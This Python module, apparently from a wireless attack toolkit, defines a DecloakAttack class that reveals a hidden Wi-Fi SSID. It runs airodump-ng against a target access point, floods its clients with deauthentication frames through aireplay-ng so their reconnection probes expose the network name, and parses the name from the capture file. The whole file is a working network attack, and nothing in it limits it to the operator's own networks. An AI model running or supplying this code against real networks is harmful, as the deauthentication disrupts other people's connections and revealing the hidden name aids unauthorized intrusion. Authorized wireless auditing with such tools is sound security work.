import subprocess
import time
import os
from ..core.ui import print_status, print_success, print_error
from ..core.config import Config

class DecloakAttack:
    def __init__(self, interface, target):
        self.interface = interface
        self.target = target

    def reveal(self):
        if self.target.essid != "<Hidden>":
            return self.target.essid

        print_status(f"Attempting to reveal hidden SSID for {self.target.bssid}...")
        
        # Start a temporary airodump to watch for the SSID
        csv_prefix = os.path.join(Config.TEMP_DIR, "decloak")
        dump_proc = subprocess.Popen([
            'airodump-ng', self.interface,
            '--bssid', self.target.bssid,
            '--channel', self.target.channel,
            '--write', csv_prefix,
            '--output-format', 'csv'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            for _ in range(5): # Try 5 times
                print_status("Sending Deauth to trigger Probe Request...")
                subprocess.run([
                    'aireplay-ng', '--deauth', '5',
                    '-a', self.target.bssid,
                    self.interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                time.sleep(5)
                
                # Check CSV for revealed SSID
                csv_file = csv_prefix + "-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, 'r') as f:
                        lines = f.readlines()
                        for line in lines:
                            if self.target.bssid in line:
                                cols = line.split(",")
                                if len(cols) > 13:
                                    essid = cols[13].strip()
                                    if essid and essid != "":
                                        print_success(f"Revealed SSID: {essid}")
                                        dump_proc.terminate()
                                        return essid
            
            print_error("Failed to reveal SSID. No probe requests captured.")
            dump_proc.terminate()
            return "<Hidden>"
        except KeyboardInterrupt:
            dump_proc.terminate()
            return "<Hidden>"
